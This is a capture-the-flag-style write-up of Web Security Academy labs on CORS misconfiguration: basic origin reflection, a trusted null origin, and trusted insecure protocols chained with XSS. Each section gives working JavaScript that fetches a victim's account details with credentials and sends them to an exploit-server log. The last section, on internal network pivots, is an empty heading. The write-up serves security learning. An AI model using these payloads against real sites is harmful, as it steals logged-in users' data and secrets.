# Title: Cross origin resource sharing , *Web Academy*
- 👨‍💻By: Nathan Hailu
- 🗒Description: Labs are solved and their write up is here.
- 📅Date: Mon 12/12/2022

================= { START } ==============================

## You try course if u have seen "Access-Control-Allow-Credentials: true" this kinda response headers!
A) **CORS vulnerability with basic origin reflection**

    When we try to test CORS we will see the response if it contains the acess-control-allow-origin or acess-control-allow-credentials header. if it have that we will try to use the origin header on the request and try to see if he pass or block it. if it pass we can exploit it with some CORS POC scripts
       
                <script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();

            function reqListener() {
                location='/log?key='+this.responseText;
            };
            </script>


B) **CORS vulnerability with trusted null origin**

    Thanks to developers they have forgoted 'null' by whitelisting it for local work. so first, we will try to add origin: example.con then we will try origin: * but when we try origin: null  it will responde with so Access-Control-Allow-Origin: null boom! we just need to run CORS POC script.

                <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
            req.withCredentials = true;
            req.send();
            function reqListener() {
                location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
            };
            </script>"></iframe>

C) **CORS vulnerability with trusted insecure protocols **

    TO detect we can try different methods.
            1, origin: *
            2, origin: https://attacker.com
            3, origin: null
            4, origin: https://attacker.OriginalURL.com
            5, origin: https://OriginalURL.com.attacker.com
            
        These things have to give {
            Access-Control-Allow-Origin: https://attacker.OriginalURL.com
            Access-Control-Allow-Credentials: true
        }
    on this lab when we try all they wont work except the method 4, there for we will try to find a subdomain, for that you can use tools, also you can check the site endpoints.
    finally, you will get stock.webacademy.com domain so we will try any open vuln on it if the site have some vuln like xss, we will craft our JS code like below.

    <script>
    document.location="http://stock.0a55009e038cde09c07b54ee00230042.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a55009e038cde09c07b54ee00230042.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a13006e037fdecbc0ae53ee0174000f.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>

D) **CORS vulnerability with internal network pivot attack**



    